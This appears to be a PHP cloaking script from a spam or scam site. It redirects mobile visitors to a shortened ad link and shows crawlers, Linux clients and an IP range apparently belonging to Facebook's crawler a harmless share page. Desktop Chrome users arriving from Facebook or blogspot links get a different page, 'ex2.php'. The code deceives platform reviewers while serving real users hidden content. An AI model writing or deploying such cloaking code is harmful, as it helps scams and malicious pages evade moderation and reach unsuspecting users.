<?php
ob_start();
require_once('includes/Mobile_Detect.php');
require_once('includes/Browser.php');
require_once('includes/functions.php');
require_once('config.php');
$detect = new Mobile_Detect;
$browser = new Browser();


$ads = "https://goo.gl/Y1sfDe";
$loc = "Location:http://".$app_site;

$isref = false;


if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
    $isref = true;
}
if (strpos($_SERVER["HTTP_REFERER"], '.events') !== false){
    $isref = true;
}
if (strpos($_SERVER["HTTP_REFERER"], 'blogspot.') !== false){
    $isref = true;
}

if($detect->isMobile() || $browser->isMobile()){
  header("Location:".$ads);
  exit();
}else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
  require_once('share.php');
}else if($browser->getBrowser() == Browser::BROWSER_CHROME && $browser->getPlatform() != Browser::PLATFORM_X11 && strpos($_SERVER["REMOTE_ADDR"], "66.220.14") === false) { 
  if($isref == true){
    
    if(strrpos($_SERVER["HTTP_HOST"], $app_site) === false){
      header($loc);
    } else {
      require_once("ex2.php");
    }
  }else{
  require_once('share.php');
  }
  exit();
}else{
  ob_end_clean();
  require_once('share.php');
  exit();
}
ob_end_flush();
?>
